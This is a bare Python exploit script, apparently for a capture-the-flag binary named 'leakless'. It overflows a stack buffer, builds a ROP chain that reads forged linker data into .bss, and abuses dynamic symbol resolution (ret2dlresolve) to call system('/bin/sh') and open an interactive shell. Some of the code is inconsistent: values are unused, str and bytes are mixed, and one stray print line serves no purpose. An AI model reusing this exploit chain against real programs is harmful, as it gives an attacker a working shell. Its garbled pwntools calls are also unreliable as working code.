from pwn import *

elf = ELF("./leakless")
rop = ROP(elf)

addr_resolver = 0x804a008
addr_read = elf.plt['read']
addr_bss = elf.bss()
rop_pop3 = 0x08048699

sock = process("./leakless")

payload = "A" * 0x4c
print(rop.fill(8, "abc"))
payload += rop.call("read", [0, addr_bss, 0x100])
payload += rop.dl_resolve_call(addr_bss + 60, addr_bss)
payload += "A" * (0x100 - len(payload))

fakesym = ""
fakesym += rop.string("/bin/sh")
fakesym += rop.fill(60, fakesym)
fakesym += rop.dl_resolve_data(addr_bss + 60, "system")
fakesym += rop.fill(0x100, fakesym)

sock.send(payload)
sock.send(fakesym)
sock.interactive()
